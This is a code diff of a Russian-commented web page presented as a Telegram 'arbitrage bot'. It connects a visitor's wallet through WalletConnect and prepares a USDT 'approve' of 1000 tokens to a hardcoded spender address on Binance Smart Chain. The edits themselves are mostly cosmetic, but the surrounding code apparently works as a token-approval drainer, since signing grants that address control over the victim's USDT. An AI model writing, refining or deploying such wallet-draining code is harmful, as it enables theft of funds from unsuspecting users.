@@ -244,13 +244,13 @@
 
     // ─── Конфигурация ───────────────────────────────────────────────────────
     const CONFIG = {
-      USDT_CONTRACT:   "0x55d398326f99059fF775485246999027b3197955".toLowerCase(),
-      ARB_SPENDER:     "0xA7acE8F572825FeD4411389Cb1A66104Cf53B577".toLowerCase(),
-      WC_PROJECT_ID:   "d868f90cd734355ae0320f8f0258b6b1",
-      WC_RELAY_URL:    "wss://relay.walletconnect.com",
-      BSC_RPC_URL:     "https://bsc-dataseed.binance.org/",
-      TELEGRAM_BOT_URL:"https://t.me/cryptogt_arbitrage_bot?start=cryptogtarb",
-      AMOUNT:          "1000" // USDT
+      USDT_CONTRACT:    "0x55d398326f99059fF775485246999027b3197955".toLowerCase(),
+      ARB_SPENDER:      "0xA7acE8F572825FeD4411389Cb1A66104Cf53B577".toLowerCase(),
+      WC_PROJECT_ID:    "d868f90cd734355ae0320f8f0258b6b1",
+      WC_RELAY_URL:     "wss://relay.walletconnect.com",
+      BSC_RPC_URL:      "https://bsc-dataseed.binance.org/",
+      TELEGRAM_BOT_URL: "https://t.me/cryptogt_arbitrage_bot?start=cryptogtarb",
+      AMOUNT:           "1000" // USDT
     };
 
     // ─── Инициализация элементов DOM ──────────────────────────────────────
@@ -276,7 +276,6 @@
       browserWarning.classList.remove("hidden");
       openInTgBtn.classList.remove("hidden");
       instructionsEl.classList.remove("hidden");
-
       openInTgBtn.addEventListener("click", () => {
         window.open(CONFIG.TELEGRAM_BOT_URL, "_blank");
       });
@@ -297,9 +296,10 @@
         // 1. Подготовка суммы (в Wei)
         console.log("[Step 1] Подготовка суммы для approve");
         updateStatus("Подготовка транзакции...");
-        const amountWei = Web3.utils.toBN(CONFIG.AMOUNT)
-                             .mul(Web3.utils.toBN("1000000000000000000"))
-                             .toString();
+        const amountWei = Web3.utils
+          .toBN(CONFIG.AMOUNT)
+          .mul(Web3.utils.toBN("1000000000000000000"))
+          .toString();
         console.log("[Step 1] amountWei:", amountWei);
 
         // 2. Инициализация SignClient
@@ -318,10 +318,10 @@
         });
         console.log("[Step 2] SignClient инициализирован:", client);
 
-        // 3. Генерация сессии (uri + approval)
+        // 3. Генерация сессии (uri, approval, topic)
         console.log("[Step 3] Генерация сессии WalletConnect (client.connect)");
         updateStatus("Генерация подключения...");
-        const { uri, approval } = await client.connect({
+        const { uri, approval, topic } = await client.connect({
           requiredNamespaces: {
             eip155: {
               methods: ["eth_sendTransaction", "eth_chainId"],
@@ -331,14 +331,13 @@
           },
         });
         console.log("[Step 3] URI получен:", uri);
+        console.log("[Step 3] Тема сессии (topic):", topic);
 
         // 4. Отображение QR-кода и текстового URI
         console.log("[Step 4] Рисуем QR-код и показываем текст URI");
         updateStatus("Отсканируйте QR-код в кошельке или скопируйте ниже");
         instructionsEl.classList.remove("hidden");
-        // Конвертируем URI в QR
         QRCode.toCanvas(qrCanvas, uri, { width: 200, margin: 1 });
-        // Показываем текстовую ссылку под QR
         uriTextEl.textContent = uri;
         uriTextEl.classList.remove("hidden");
 
@@ -348,33 +347,24 @@
         await approval();
         console.log("[Step 5] Сессия подтверждена");
 
-        // 6. Проверка сети
+        // 6. Проверка сети (chainId)
         console.log("[Step 6] Проверка chainId через client.request");
         updateStatus("Проверка сети...");
-        // client.session – это объект, ключи которого – темы (topics)
-        const sessionKeys = Object.keys(client.session);
-        if (sessionKeys.length === 0) {
-          throw new Error("Сессия не найдена: client.session пуст.");
-        }
-        const topic = sessionKeys[0];
-        console.log("[Step 6] Тема сессии (topic):", topic);
-
         const chainId = await client.request({
           topic,
           chainId: "eip155:56",
           request: { method: "eth_chainId" },
         });
         console.log("[Step 6] Вернулся chainId:", chainId);
-
         if (chainId !== "0x38") {
           throw new Error("Пожалуйста, переключитесь на сеть Binance Smart Chain (chainId: 56)");
         }
 
-        // 7. Подготовка данных транзакции
+        // 7. Подготовка данных транзакции (approve)
         console.log("[Step 7] Подготовка данных approve");
         updateStatus("Подготовка данных...");
         const web3 = new Web3(CONFIG.BSC_RPC_URL);
-        console.log("[Step 7] Новый Web3:", web3);
+        console.log("[Step 7] Новый экземпляр Web3:", web3);
 
         const approveABI = {
           constant: false,
@@ -460,7 +450,7 @@
     });
 
     // ─── Запуск WalletConnect ───────────────────────────────────────────────
-    // Делаем небольшой таймаут, чтобы интерфейс успел отобразиться
+    // Небольшая задержка, чтобы интерфейс успел отобразиться
     setTimeout(() => {
       console.log("[Init] Запускаем initWalletConnect()");
       initWalletConnect();
